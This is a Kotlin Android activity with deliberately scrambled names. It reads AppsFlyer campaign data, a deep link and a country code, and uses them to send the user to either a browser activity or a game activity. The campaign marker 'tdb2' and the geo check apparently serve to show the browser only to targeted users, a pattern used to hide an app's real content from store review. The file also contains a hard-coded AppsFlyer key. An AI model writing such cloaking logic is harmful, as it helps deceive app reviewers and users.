package com.superplusgames.hosandroi.aaaaactivv.sssorot


import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.orhanobut.hawk.Hawk
import com.superplusgames.hosandroi.aaaaactivv.bbbbbbr.BrovActivity
import com.superplusgames.hosandroi.aaaaactivv.gaame.GgggggameActivity
import com.superplusgames.hosandroi.databinding.ActivitySortTviiiBinding
import com.superplusgames.hosandroi.ottther.Saaasha.DEEPLfrtggttggtfrfrfr
import com.superplusgames.hosandroi.ottther.Saaasha.appsCheckfrr6656565
import com.superplusgames.hosandroi.ottther.Saaasha.countryCodefrrfrfrfrrfgt5tg5gt56
import com.superplusgames.hosandroi.ottther.Saaasha.geomeogtgtgtgtgt5
import com.superplusgames.hosandroi.ottther.Saaasha.gtgt5gt5t5gt5
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class SortTviiiActivity : AppCompatActivity() {


    private val ghyhyju = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(gtgt5gt5t5gt5, dataGotten)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    lateinit var nhhnhnnhnh: ActivitySortTviiiBinding

    private fun intLONEfrfrrf() {
        val hyjhyijyjihjijyh = Intent(this@SortTviiiActivity, GgggggameActivity::class.java)
        gtjgtjtgigtjgtji()
        startActivity(hyjhyijyjihjijyh)
        finish()
    }

    private fun intWEdrfrrf() {
        val nbjbgnbgnbgnbg = Intent(this@SortTviiiActivity, BrovActivity::class.java)
        gtjgtjtgigtjgtji()
        startActivity(nbjbgnbgnbgnbg)
        finish()
    }

    private fun gtjgtjtgigtjgtji() {
        Hawk.put(geomeogtgtgtgtgt5, null)
        ggggggggggfrrf()
    }

    private fun ggggggggggfrrf() {
        Hawk.put(countryCodefrrfrfrfrrfgt5tg5gt56, null)
        Hawk.put(appsCheckfrr6656565, null)
    }

    override fun onCreate(savedInstanceState: Bundle?) {

        val fgtgtgtgt = "1"

        super.onCreate(savedInstanceState)
        nhhnhnnhnh = ActivitySortTviiiBinding.inflate(layoutInflater)
        setContentView(nhhnhnnhnh.root)
        val appsChfrffrrf: String? = Hawk.get(appsCheckfrr6656565, "null")

        if (appsChfrffrrf == fgtgtgtgt) {
            AppsFlyerLib.getInstance()
                .init("aKbCAS73ZgVEoNoTH9zjrR", ghyhyju, applicationContext)
            AppsFlyerLib.getInstance().start(this)
        }

        hyhyhhy()

    }



    private fun hyhyhhy() {

        val ftgtgttggtgtgtgt: String = Hawk.get(geomeogtgtgtgtgt5)
        val gijtjgijtgj: String = Hawk.get(countryCodefrrfrfrfrrfgt5tg5gt56, "null")

        val hyjyhjyhjihy: String? = Hawk.get(DEEPLfrtggttggtfrfrfr, "null")
        val thghthghhgth: String? = Hawk.get(appsCheckfrr6656565, "null")
        var nvgnvjvfnnfv: String? = Hawk.get(gtgt5gt5t5gt5)

        if (thghthghhgth == "1") {

            val vfbvfbhvfhvfbh = Executors.newSingleThreadScheduledExecutor()
            vfbvfbhvfhvfbh.scheduleAtFixedRate({
                if (nvgnvjvfnnfv != null) {

                    if (nvgnvjvfnnfv!!.contains("tdb2") || ftgtgttggtgtgtgt.contains(gijtjgijtgj) || hyjyhjyhjihy!!.contains("tdb2")) {
                        vfbvfbhvfhvfbh.shutdown()
                        intWEdrfrrf()
                    } else {
                        vfbvfbhvfhvfbh.shutdown()
                        intLONEfrfrrf()

                    }
                } else {
                    nvgnvjvfnnfv = Hawk.get(gtgt5gt5t5gt5)

                }
            }, 0, 1, TimeUnit.SECONDS)
        }  else if (ftgtgttggtgtgtgt.contains(gijtjgijtgj)) {

            intWEdrfrrf()
        } else {

            intLONEfrfrrf()
        }
    }
}